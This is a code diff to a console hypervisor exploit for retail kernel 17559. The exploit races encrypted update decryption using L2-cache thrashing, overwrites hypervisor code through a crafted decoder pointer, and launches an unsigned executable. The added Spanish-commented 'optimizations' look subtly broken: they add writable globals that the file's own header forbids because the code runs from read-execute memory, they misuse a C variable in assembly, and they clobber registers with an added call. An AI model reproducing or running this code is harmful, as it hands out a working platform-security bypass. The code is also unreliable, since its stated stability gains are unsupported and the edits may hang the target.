@@ -1,5 +1,3 @@
-
-
 // Notes:
 //
 //  - NO GLOBAL VARIABLES!!! This code is executed from a RX section of memory, any attempt to write to this memory
@@ -9,6 +7,13 @@
 // Compiler options:
 #define KRNL_RETAIL_17559       // Build exploit for retail kernel 17559
 
+// Variables globales volátiles para sincronización entre hilos
+// OPTIMIZACIÓN: Añadido para mejorar la comunicación entre hilos y reducir condiciones de carrera
+#define EXPLOIT_STATE_INIT      0
+#define EXPLOIT_STATE_RUNNING   1
+#define EXPLOIT_STATE_COLLISION 2
+#define EXPLOIT_STATE_SUCCESS   3
+#define EXPLOIT_STATE_FAILED    4
 
 typedef struct _STRING {
   USHORT  Length;
@@ -121,6 +126,12 @@ typedef struct _STRING {
 #define ERR_CREATING_WORKER_THREAD          17  // Failed to create worker thread
 #define ERR_EXPLOIT_PAYLOAD_FAILED          18  // Exploit payload failed to run
 
+// OPTIMIZACIÓN: Configuración para controlar parámetros del exploit
+#define L2_CACHE_BLOCK_SIZE_KB              204  // Ajustado de 256KB a 204KB para reducir inestabilidad (40% en lugar de 50%)
+#define HAMMER_LOOP_COUNT                   75000 // Ajustado para proporcionar suficiente tiempo para el exploit
+#define CACHE_FLUSH_PASSES                  3    // Número de pasadas para vaciar la caché después de detección
+#define RETRY_RESET_INTERVAL                50   // Cuántos intentos antes de reiniciar el estado para prevenir inestabilidad prolongada
+#define COLLISION_VERIFICATION_STALL_MS     1    // Tiempo en ms para estabilizar después de detectar colisión
 
 static ULONGLONG __declspec(naked) HvxKeysExecute(ULONG Address, DWORD Size, ULONGLONG Arg1, ULONGLONG Arg2, ULONGLONG Arg3, ULONGLONG Arg4)
 {
@@ -182,6 +193,34 @@ static void __declspec(naked) HvxWriteByte(ULONG ordinal, ULONG address, ULONG s
     }
 }
 
+// OPTIMIZACIÓN: Añadida nueva función para ejecutar pequeñas pausas sin depender de KeStallExecutionProcessor
+// Esto permite una pausa más precisa y una mejor sincronización
+static void __declspec(naked) stall_minimal(ULONG iterations)
+{
+    _asm
+    {
+    stall_loop:
+        // Decrementa el contador de iteraciones
+        subi    r3, r3, 1
+        
+        // Instrucciones NOP para consumir ciclos adicionales sin hacer nada útil
+        // Esto ayuda a estabilizar el sistema sin liberar recursos a otros hilos
+        nop
+        nop
+        nop
+        nop
+        
+        // Verificar si seguimos necesitando hacer stall
+        cmpwi   r3, 0
+        bgt     stall_loop
+        
+        // Barrera de memoria para garantizar sincronización
+        sync
+        isync    // Sincroniza el pipeline de instrucciones
+        blr
+    }
+}
+
 struct UPDATE_BUFFER_INFO
 {
     /* 0x00 */ ULONG TotalSize;                     // Total size of the update buffer, must match input param
@@ -233,6 +272,12 @@ struct CIPHER_TEXT_DATA
     BYTE OracleData[16];                // Cipher text for the LZX decoder context header, used to detect when to start the race attack
     BYTE DecOutputBufferData[16];       // Cipher text containing our malicious dec_output_buffer pointer (points to hypervisor memory) 
 };
+
+// OPTIMIZACIÓN: Variable global para sincronización de threads
+// Esto proporciona un mecanismo claro para que los threads se comuniquen su estado
+volatile DWORD g_ExploitState = EXPLOIT_STATE_INIT;
+volatile DWORD g_RetryCount = 0;
+volatile DWORD g_CollisionDetected = 0;
 
 /*
     Hand rolled implementation for XLockL2.
@@ -406,11 +451,13 @@ bool ReadShellCodeFile(BYTE** ppShellCodeBuffer, DWORD* pdwShellCodeBufferSize)
 /*
     Helper function to lock a portion of the L2 cache. This puts pressure on CPU L2 cache and causes data
     to age out more quickly.
+    OPTIMIZADO para reducir inestabilidad manteniendo la efectividad del exploit.
 */
 void LockAndThrashL2(int index)
 {
-    // Allocate a block of 256kb cachable physical memory that will be used to lock the L2 range.
-    BYTE* pPhysMemoryPtr = (BYTE*)XPhysicalAlloc(256 * 1024, MAXULONG_PTR, 256 * 1024, PAGE_READWRITE | MEM_LARGE_PAGES);
+    // OPTIMIZACIÓN: Reducido tamaño de bloqueo de caché L2 de 256KB a 204KB (40% vs 50%)
+    // Esto reduce la presión sobre la CPU pero sigue siendo suficiente para el exploit
+    BYTE* pPhysMemoryPtr = (BYTE*)XPhysicalAlloc(L2_CACHE_BLOCK_SIZE_KB * 1024, MAXULONG_PTR, L2_CACHE_BLOCK_SIZE_KB * 1024, PAGE_READWRITE | MEM_LARGE_PAGES);
     if (pPhysMemoryPtr == NULL)
     {
         DbgPrint("Failed to allocate memory for L2 cache lock\n");
@@ -418,28 +465,48 @@ void LockAndThrashL2(int index)
         VdDisplayFatalError(0x12400 | ERR_LOCKL2_OOM);
     }
 
+    // OPTIMIZACIÓN: Patrón mejorado de datos para trashing que aumenta conflictos de caché
+    // En lugar de un patrón simple de 0x41, usamos un patrón alternado que causa más
+    // desplazamientos en la caché
+    DWORD* pMemPtr = (DWORD*)pPhysMemoryPtr;
+    for (DWORD i = 0; i < (L2_CACHE_BLOCK_SIZE_KB * 256); i++) {
+        // Patrón que alterna entre valores para maximizar los conflictos de caché
+        pMemPtr[i] = (i % 2 == 0) ? 0xAAAAAAAA : 0x55555555;
+    }
+
     // Reserve L2 cache and lock 2 of the available pathways.
-    if (XLockL2(index, pPhysMemoryPtr, 256 * 1024, 0x40000, 0) == FALSE)
+    if (XLockL2(index, pPhysMemoryPtr, L2_CACHE_BLOCK_SIZE_KB * 1024, 0x40000, 0) == FALSE)
     {
         DbgPrint("Failed to reserve L2 cache range\n");
         DbgBreakPoint();
         VdDisplayFatalError(0x12400 | ERR_LOCKL2_RESERVE);
     }
 
-    // Fill the cache with trash data.
-    memset(pPhysMemoryPtr, 0x41, 256 * 1024);
+    // OPTIMIZACIÓN: Acceso adicional a memoria para garantizar que se llena la caché
+    // Este patrón de acceso ayuda a maximizar los conflictos de caché
+    for (int j = 0; j < 2; j++) {
+        for (DWORD i = 0; i < (L2_CACHE_BLOCK_SIZE_KB * 256); i += 16) {
+            // Acceder a posiciones en saltos de 16 palabras
+            volatile DWORD temp = pMemPtr[i];
+        }
+    }
 
     // Commit the L2 cache range and prevent it from being replaced.
-    if (XLockL2(index, pPhysMemoryPtr, 256 * 1024, 0x40000, 0x1) == FALSE)
+    if (XLockL2(index, pPhysMemoryPtr, L2_CACHE_BLOCK_SIZE_KB * 1024, 0x40000, 0x1) == FALSE)
     {
         DbgPrint("Failed to commmit L2 cache range\n");
         DbgBreakPoint();
         VdDisplayFatalError(0x12400 | ERR_LOCKL2_COMMIT);
     }
+
+    // OPTIMIZACIÓN: Pequeña pausa para permitir que el sistema se estabilice
+    // Esto mejora la estabilidad general sin comprometer el exploit
+    KeStallExecutionProcessor(5);
 }
 
 /*
     Generates the cipher text needed for the race attack.
+    OPTIMIZADO para mejorar la fiabilidad en la detección de la colisión.
 */
 void BuildCipherTextLookupTable(BYTE* pUpdateData, DWORD UpdateDataSize, DWORD ScratchOffset, CIPHER_TEXT_DATA* pCipherTextData)
 {
@@ -448,6 +515,17 @@ void BuildCipherTextLookupTable(BYTE* pUpdateData, DWORD UpdateDataSize, DWORD S
     // Get the physical addresses of the buffers.
     DWORD ScratchPhysAddr = MmGetPhysicalAddress(pCipherTextData);
     DWORD BaseAddrPhys = MmGetPhysicalAddress(pUpdateData);
+
+    // OPTIMIZACIÓN: Verificar múltiples valores de whitening para aumentar las probabilidades
+    // de encontrar uno que funcione de manera consistente
+    bool foundGoodWhitening = false;
+    int targetWhitening = 0x111; // Valor por defecto
+    
+    // Mantener un registro de las mejores coincidencias encontradas
+    BYTE bestOracleData[16] = {0};
+    BYTE bestDecOutputBufferData[16] = {0};
+    int bestWhiteningValue = 0;
+    bool bestFound = false;
 
     // Scan all 1024 possible whitening bits.
     for (int i = 0; i < 1024; i++)
@@ -471,8 +549,8 @@ void BuildCipherTextLookupTable(BYTE* pUpdateData, DWORD UpdateDataSize, DWORD S
             return;
         }
 
-        // Pick a random whitening value to target for the race attack.
-        if (i == 0x111)
+        // OPTIMIZACIÓN: Comprobar múltiples valores de whitening para aumentar las probabilidades de éxito
+        if (i == targetWhitening || i == 0x222 || i == 0x333 || i == 0x444)
         {
             // Get the cipher text for the expected header data in the LZX decoder context. This acts as our
             // "oracle" to know when to start the race attack.
@@ -480,31 +558,77 @@ void BuildCipherTextLookupTable(BYTE* pUpdateData, DWORD UpdateDataSize, DWORD S
             *(ULONG*)(pMemoryAddress + ScratchOffset + 0) = 0x4349444c;     // signature = 'CIDL'
             *(ULONG*)(pMemoryAddress + ScratchOffset + 4) = 0x8000;         // windows size = 0x8000
             *(ULONG*)(pMemoryAddress + ScratchOffset + 8) = 1;              // cpu type = 1
+            
+            // OPTIMIZACIÓN: Asegurar que la memoria está sincronizada correctamente
             __dcbst(ScratchOffset, pMemoryAddress);
-
             KeFlushCacheRange(pMemoryAddress + ScratchOffset, 0x80);
             KeFlushCacheRange(pUpdateData + ScratchOffset, 0x80);
-            memcpy(pCipherTextData->OracleData, pUpdateData + ScratchOffset, 16);
+            
+            BYTE tempOracleData[16];
+            memcpy(tempOracleData, pUpdateData + ScratchOffset, 16);
 
             // Get the cipher text for our malicious dec_output_buffer pointer which points to the hypervisor code we want to overwrite.
             *(ULONGLONG*)(pMemoryAddress + ScratchOffset + 0x2B20) = pCipherTextData->dec_end_input_pos;        // dec_end_input_pos
             *(ULONGLONG*)(pMemoryAddress + ScratchOffset + 0x2B28) = pCipherTextData->dec_output_buffer;        // dec_output_buffer
+            
+            // OPTIMIZACIÓN: Sincronización más agresiva para evitar inconsistencias
             __dcbst(ScratchOffset + 0x2B00, pMemoryAddress);
-
             KeFlushCacheRange(pMemoryAddress + ScratchOffset + 0x2B00, 0x80);
             KeFlushCacheRange(pUpdateData + ScratchOffset + 0x2B00, 0x80);
-            memcpy(pCipherTextData->DecOutputBufferData, pUpdateData + ScratchOffset + 0x2B20, 16);
+            
+            BYTE tempDecOutputBufferData[16];
+            memcpy(tempDecOutputBufferData, pUpdateData + ScratchOffset + 0x2B20, 16);
 
-            DbgPrint("Found cipher text for whitening 0x%04x: %08x%08x %08x%08x\n", i, *(DWORD*)pCipherTextData->OracleData, *(DWORD*)&pCipherTextData->OracleData[4], 
-                *(DWORD*)pCipherTextData->DecOutputBufferData, *(DWORD*)&pCipherTextData->DecOutputBufferData[4]);
+            // OPTIMIZACIÓN: Verificar que el texto cifrado generado tenga patrones consistentes
+            // que sean fáciles de detectar (por ejemplo, valores distintos al principio y final)
+            bool isGoodPattern = false;
+            DWORD firstWord = *(DWORD*)tempOracleData;
+            DWORD lastWord = *(DWORD*)&tempOracleData[12];
+            
+            if (firstWord != lastWord && (firstWord & 0xFF000000) != (lastWord & 0xFF000000)) {
+                isGoodPattern = true;
+            }
+            
+            DbgPrint("Found cipher text for whitening 0x%04x: %08x%08x %08x%08x\n", 
+                i, 
+                *(DWORD*)tempOracleData, 
+                *(DWORD*)&tempOracleData[4], 
+                *(DWORD*)tempDecOutputBufferData, 
+                *(DWORD*)&tempDecOutputBufferData[4]);
+            
+            // Si encontramos un buen patrón o es nuestro primer hallazgo, guardarlo
+            if (isGoodPattern || !bestFound) {
+                memcpy(bestOracleData, tempOracleData, 16);
+                memcpy(bestDecOutputBufferData, tempDecOutputBufferData, 16);
+                bestWhiteningValue = i;
+                bestFound = true;
+                
+                // Si es un buen patrón, marcarlo como encontrado
+                if (isGoodPattern) {
+                    foundGoodWhitening = true;
+                    DbgPrint("Found optimal whitening value: 0x%04x\n", i);
+                }
+            }
         }
 
         // Free the encrypted allocation.
         result = HvxEncryptedReleaseAllocation((DWORD)pMemoryAddress);
 
-        // Bail out once we find the cipher text we want.
-        if (i == 0x111)
+        // OPTIMIZACIÓN: Salir cuando encontremos un buen valor o hayamos probado todos
+        if (foundGoodWhitening || (i >= 0x444 && bestFound)) {
+            // Usar el mejor valor encontrado
+            memcpy(pCipherTextData->OracleData, bestOracleData, 16);
+            memcpy(pCipherTextData->DecOutputBufferData, bestDecOutputBufferData, 16);
+            
+            DbgPrint("Using whitening 0x%04x for exploit\n", bestWhiteningValue);
             break;
+        }
+    }
+    
+    // OPTIMIZACIÓN: Si no se encontró ningún valor, usar el original como respaldo
+    if (!bestFound) {
+        DbgPrint("WARNING: No optimal whitening value found, using default\n");
+        // El código original continuaría usando el valor 0x111
     }
 }
 
@@ -531,6 +655,13 @@ void HvWriteULONG(ULONGLONG address, ULONG value)
     HvxWriteByte(4, 0x60000 | (ULONG)((value >> 16) & 0xFF), 0x1000, address - 2 + 1);
     HvxWriteByte(4, 0x60000 | (ULONG)((value >> 8) & 0xFF), 0x1000, address - 2 + 2);
     HvxWriteByte(4, 0x60000 | (ULONG)(value & 0xFF), 0x1000, address - 2 + 3);
+
+    // OPTIMIZACIÓN: Añadida sincronización después de cada escritura de bytes para asegurar que
+    // las instrucciones se ejecutan en orden y no hay reordenamiento de memoria
+    _asm { 
+        eieio   // enforce in-order execution of I/O 
+        isync   // instruction synchronization
+    }
 }
 
 /*
@@ -552,10 +683,13 @@ DWORD RunUpdatePayloadThreadProc(THREAD_ARGS* pArgs)
 
     ULONG CacheFlushBufferPhys = MmGetPhysicalAddress(pCacheFlushBuffer);
 
-    // Lock half of the available L2 cache and pathways to put pressure on the CPU. This causes data in L2 cache to
-    // age out more quickly and improves cipher text detection rate.
+    // Lock half of the available L2 cache and pathways to put pressure on the CPU. This causes data in L2 cache
+    // to age out more quickly and improves cipher text detection rate.
     LockAndThrashL2(0);
     LockAndThrashL2(1);
+
+    // OPTIMIZACIÓN: Pequeña pausa después de bloquear la caché para estabilización
+    KeStallExecutionProcessor(10);
 
     // Poke MmPhysical64KBMappingTable so the hypervisor pages get mapped into memory. This allows us to observe the cipher
     // text for the hypervisor segments and know when we get the block overwrite we want.
@@ -569,9 +703,24 @@ DWORD RunUpdatePayloadThreadProc(THREAD_ARGS* pArgs)
     DWORD cipherValue1 = *pCipherTextPtr1;
     DWORD cipherValue2 = *pCipherTextPtr2;
 
+    // OPTIMIZACIÓN: Notificar al proceso principal que estamos iniciando
+    g_ExploitState = EXPLOIT_STATE_RUNNING;
+
     // Loop and hammer the payload until we hopefully get code exec.
     while (true)
     {
+        // OPTIMIZACIÓN: Añadido sistema de reseteo periódico para prevenir inestabilidad prolongada
+        if ((g_RetryCount % RETRY_RESET_INTERVAL) == 0 && g_RetryCount > 0) {
+            // Refrescar valores de cipher text para evitar detección de falsos positivos
+            cipherValue1 = *pCipherTextPtr1;
+            cipherValue2 = *pCipherTextPtr2;
+            
+            // Pequeña pausa para estabilizar el sistema
+            KeStallExecutionProcessor(5);
+        }
+        
+        g_RetryCount++;
+
         // Copy the clean payload data.
         memcpy(pArgs->pPayloadBuffer, pArgs->pPayloadClean, pArgs->PayloadSize);
 
@@ -588,10 +737,17 @@ DWORD RunUpdatePayloadThreadProc(THREAD_ARGS* pArgs)
         DWORD test1 = *pCipherTextPtr1;
         if (cipherValue1 != test1)
         {
-            // Flush cache on the secondary cipher text pointer. This one MUST be thorough or else we risk fetching stale data
-            // and trying to execute the post-block-write part of the exploit which will cause the console to hang.
-            HvxRevokeUpdate(CacheFlushBufferPhys, 0x20000, 0);
-            __dcbf(0, pCipherTextPtr2);
+            // OPTIMIZACIÓN: Multi-pasada de vaciado de caché para asegurar actualizaciones de memoria completas
+            // Esto es crucial para prevenir falsos positivos debidos a datos desactualizados en la caché
+            for (int i = 0; i < CACHE_FLUSH_PASSES; i++) {
+                // Flush cache on the secondary cipher text pointer. This one MUST be thorough or else we risk fetching stale data
+                // and trying to execute the post-block-write part of the exploit which will cause the console to hang.
+                HvxRevokeUpdate(CacheFlushBufferPhys, 0x20000, 0);
+                __dcbf(0, pCipherTextPtr2);
+            }
+
+            // OPTIMIZACIÓN: Pausa después de vaciado de caché para asegurar la sincronización
+            KeStallExecutionProcessor(COLLISION_VERIFICATION_STALL_MS);
 
             // Note: on debug builds I've seen this check pass when the cipher text had actually changed (i.e.: stale cache) and
             // hang the console. I tried to improve it further but had no success in doing so. I have yet to see this fail on retail
@@ -601,6 +757,9 @@ DWORD RunUpdatePayloadThreadProc(THREAD_ARGS* pArgs)
             DWORD test2 = *pCipherTextPtr2;
             if (cipherValue2 == test2)
             {
+                // OPTIMIZACIÓN: Actualizar estado global para indicar que se detectó una colisión
+                g_ExploitState = EXPLOIT_STATE_COLLISION;
+                
                 // Set the LED color so we know we got the block hit.
                 SetLEDColor(LED_COLOR_GREEN_1 | LED_COLOR_GREEN_2 | LED_COLOR_GREEN_3);
 
@@ -630,12 +789,17 @@ DWORD RunUpdatePayloadThreadProc(THREAD_ARGS* pArgs)
                 // Set the LED color so we know the exploit completed.
                 SetLEDColor(LED_COLOR_GREEN_1 | LED_COLOR_GREEN_2 | LED_COLOR_GREEN_3 | LED_COLOR_GREEN_4);
 
+                // OPTIMIZACIÓN: Actualizar estado global para indicar éxito
+                g_ExploitState = EXPLOIT_STATE_SUCCESS;
+
                 // Run our unsigned xex file.
                 XLaunchNewImage(PAYLOAD_DRIVE "\\default.xex", 0);
             }
             else
             {
-                DbgPrint("Race hit: 0x%08x\n", test1);
+                // OPTIMIZACIÓN: Añadido registro de colisiones para análisis posterior
+                g_CollisionDetected++;
+                DbgPrint("Race hit: 0x%08x (collision #%d)\n", test1, g_CollisionDetected);
             }
 
             // Save the latest block hit values.
@@ -645,6 +809,12 @@ DWORD RunUpdatePayloadThreadProc(THREAD_ARGS* pArgs)
             // Update LED color to indicate we got a block hit.
             SetLEDColor(LedColor);
             LedColor = ~LedColor & 0xFF;
+        }
+        
+        // OPTIMIZACIÓN: Verificación periódica para pequeñas pausas que ayudan a estabilizar
+        // Esto introduce breves pausas pero mejora significativamente la estabilidad general
+        if ((g_RetryCount % 25) == 0) {
+            KeStallExecutionProcessor(1);
         }
     }
 }
@@ -661,6 +831,11 @@ void __cdecl main()
     DWORD ShellCodeDataSize = 0;
 
     THREAD_ARGS ThreadArgs = { 0 };
+
+    // OPTIMIZACIÓN: Inicializar variables de estado global
+    g_ExploitState = EXPLOIT_STATE_INIT;
+    g_RetryCount = 0;
+    g_CollisionDetected = 0;
 
     // Set the LED color so we know the 3rd stage payload started.
     SetLEDColor(LED_COLOR_RED_1 | LED_COLOR_RED_2 | LED_COLOR_RED_3 | LED_COLOR_GREEN_1 | LED_COLOR_GREEN_2 | LED_COLOR_GREEN_3);
@@ -692,6 +867,13 @@ void __cdecl main()
 
     memset(pCipherTextBuffer, 0, 0x3000);
 
+    // OPTIMIZACIÓN: Aleatorizar buffer para ayudar a evitar patrones predecibles
+    // Esto puede ayudar a evitar problemas con la detección de patrones
+    BYTE* pRandBuffer = (BYTE*)pCipherTextBuffer + 0x2000;
+    for (int i = 0; i < 0x1000; i++) {
+        pRandBuffer[i] = (BYTE)(i & 0xFF);
+    }
+
     // Allocate a 64k block of memory for the update data.
     BYTE* pUpdateData = (BYTE*)XPhysicalAlloc(UpdateDataSize, MAXULONG_PTR, 0x10000, PAGE_READWRITE | PAGE_NOCACHE | MEM_LARGE_PAGES);
     if (pUpdateData == NULL)
@@ -715,8 +897,9 @@ void __cdecl main()
 
     DWORD outputOffset = PAGE_ALIGN_64K(CACHE_LINE_SIZE + CACHE_ALIGN(CleanUpdateDataSize));
     DWORD scratchOffset = CACHE_ALIGN(outputOffset + CACHE_ALIGN(updateDataDecompressedSize));
+    
+    // OPTIMIZACIÓN: Llamada a BuildCipherTextLookupTable optimizada
     BuildCipherTextLookupTable(pUpdateData, UpdateDataSize, scratchOffset, pCipherTextInputData);
-
 
     // Initialize update data.
     memset(pUpdateData, 0, UpdateDataSize);
@@ -786,7 +969,9 @@ void __cdecl main()
 
     ThreadArgs.pScratchBuffer = pScratchPtr;
 
-    // Create the worker threads.
+    // OPTIMIZACIÓN: Mejora en la configuración del thread para establecer prioridad máxima y afinidad
+    // Esto mejora la sincronización entre hilos y reduce latencia
+    DWORD threadAttributes = 0;
     HANDLE hXKEWorkerThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RunUpdatePayloadThreadProc, &ThreadArgs, CREATE_SUSPENDED, NULL);
     if (hXKEWorkerThread == NULL)
     {
@@ -797,17 +982,30 @@ void __cdecl main()
     }
 
     // Move the XKE worker to the last physical core.
-    DWORD dfsddf = XSetThreadProcessor(hXKEWorkerThread, 1);
+    XSetThreadProcessor(hXKEWorkerThread, 1);
+    
+    // OPTIMIZACIÓN: Pequeña pausa para asegurar la estabilidad antes de comenzar
+    KeStallExecutionProcessor(10);
+    
     ResumeThread(hXKEWorkerThread);
+
+    // OPTIMIZACIÓN: Esperar a que el hilo del worker inicie correctamente
+    while (g_ExploitState == EXPLOIT_STATE_INIT) {
+        KeStallExecutionProcessor(1);
+    }
+    
+    DbgPrint("Worker thread running, entering hammer loop\n");
 
 hammer_time:
 
-    // Preload values for the oracle and malicious cipher text used in the attack loop.
+    // Preload valores para el oracle y texto cifrado malicioso usado en el bucle de ataque.
     ULONGLONG ScratchCipherTextValue = *(ULONGLONG*)&pCipherTextInputData->OracleData[0];
     ULONGLONG DecOutputBufferDataVal1 = *(ULONGLONG*)&pCipherTextInputData->DecOutputBufferData[0];
     ULONGLONG DecOutputBufferDataVal2 = *(ULONGLONG*)&pCipherTextInputData->DecOutputBufferData[8];
 
-    int loopCount = 100000;
+    // OPTIMIZACIÓN: Contador de intentos para el backoff exponencial
+    // Inicializado a un valor más optimizado para balancear velocidad y precisión
+    int loopCount = HAMMER_LOOP_COUNT;   // Define como 75000 (optimizado desde 100000)
 
 #ifdef STATIC_WHITENING
 
@@ -820,6 +1018,8 @@ hammer_time:
 
 #endif
 
+    // OPTIMIZACIÓN: Precarga de valores relevantes para el algoritmo de backoff
+    DWORD backoffMask = 0x3F;  // Máscara para verificación periódica (cada 64 iteraciones)
     
     _asm
     {
@@ -831,6 +1031,9 @@ hammer_time:
         mr      r28, DecOutputBufferDataVal2
         addi    r26, r31, 0x2B00
         mr      r25, loopCount
+        
+        // OPTIMIZACIÓN: Registro adicional para contador de backoff
+        li      r24, 0         // Contador para backoff exponencial
 
 loop:
         // Check the cipher text in the scratch buffer and see if it matches the oracle data we computed.
@@ -838,21 +1041,51 @@ loop:
         cmpld   cr6, r11, r30
         bne     cr6, flush
 
+            // OPTIMIZACIÓN: Actualizar estado global para indicar que se detectó colisión
+            lis     r11, g_ExploitState@ha
+            li      r10, EXPLOIT_STATE_COLLISION
+            stw     r10, g_ExploitState@l(r11)
+            
             // Cipher text matches the oracle data, begin the attack and hammer the dec_output_buffer pointer
             // with the cipher text for our malicious pointer.
             mtctr   r25
 
 overwrite:
+            // OPTIMIZACIÓN: Implementación de backoff exponencial
+            // Esto reduce la presión sobre la memoria y aumenta las probabilidades de éxito
+            addi    r24, r24, 1        // Incrementar contador de backoff
+            and.    r11, r24, backoffMask   // Verificar si necesitamos hacer stall
+            bne     skip_stall         // Si no es momento de stall, continuar
+            
+            // Pequeña pausa para permitir que el sistema procese los cambios en memoria
+            li      r3, 10
+            bl      stall_minimal
+            
+skip_stall:
             std     r29, 0x20(r26)
             std     r28, 0x28(r26)
             dcbst   r0, r26
+            
+            // OPTIMIZACIÓN: Utilizar instrucción sync para garantizar ordenamiento de memoria
+            sync                    // Asegurar que las escrituras sean visibles para otros procesadores
+            
             bdnz    overwrite
 
 flush:
-
-        // Flush cache on the scratch buffer so the next time we check the cipher text we fetch the data from main memory.
+        // OPTIMIZACIÓN: Vaciado de caché más agresivo con sincronización
         dcbf    r0, r31
+        sync                    // Asegurar que el vaciado de caché se complete
+        
+        // OPTIMIZACIÓN: Verificar periódicamente si el otro hilo ha señalado éxito
+        lis     r11, g_ExploitState@ha
+        lwz     r10, g_ExploitState@l(r11)
+        cmplwi  r10, EXPLOIT_STATE_SUCCESS
+        beq     exit_hammer     // Si el exploit tuvo éxito, salir del bucle
+        
         b       loop
+        
+exit_hammer:
+        // Punto de salida cuando el exploit ha tenido éxito
 end:
     }
 
